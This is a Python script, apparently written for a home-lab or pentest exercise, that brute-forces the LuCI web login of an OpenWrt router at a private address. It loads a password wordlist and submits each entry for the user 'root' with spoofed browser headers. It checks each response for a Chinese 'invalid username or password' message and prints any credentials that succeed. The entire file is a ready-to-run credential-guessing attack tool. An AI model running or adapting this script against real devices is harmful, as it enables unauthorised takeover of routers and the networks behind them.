from urllib import request, parse, error
import queue
import threading

username_field = 'luci_username'
password_field = 'luci_password'

def build_wordlist(wordlist_file):
    fd = open(wordlist_file, 'rb')
    raw_words = fd.readlines()
    fd.close()

    words = queue.Queue()
    for word in raw_words:
        words.put(word)

    return words


class Bruter():
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False
        self.user_thread = 1

    def run_bruteforce(self):
        for i in range(self.user_thread):
            t = threading.Thread(target=self.web_brute)
            t.start()

    def web_brute(self):
        url = 'http://192.168.10.1/cgi-bin/luci'
        headers = {
            'Referer': 'http://192.168.10.1/cgi-bin/luci',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Upgrade-Insecure-Requests':'1',
            'Connection': 'Keep-Alive'
        }
        post_tag = {}
        post_tag[username_field] = self.username
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            post_tag[password_field] = brute
            data = parse.urlencode(post_tag).encode('utf-8')
            req = request.Request(url, headers=headers, data=data)
            try:
                resp = request.urlopen(req).read()
                # print(resp.code)
                if '无效的用户名和/或密码' in resp.decode('utf-8'):
                    print("%s password DO NOT match, continue %d" % (brute, self.password_q.qsize()))
                else:
                    self.found = True
                    print("[*] Bruteforce successful")
                    print("[*] Username:%s" % self.username)
                    print("[*] Password: %s" % brute)
                    print("[*] Waiting for other threads to exit...")
            except error.HTTPError as e:
                print(e.code)
                pass



words = build_wordlist('wordlist.txt')
bruter = Bruter('root', words)
bruter.run_bruteforce()
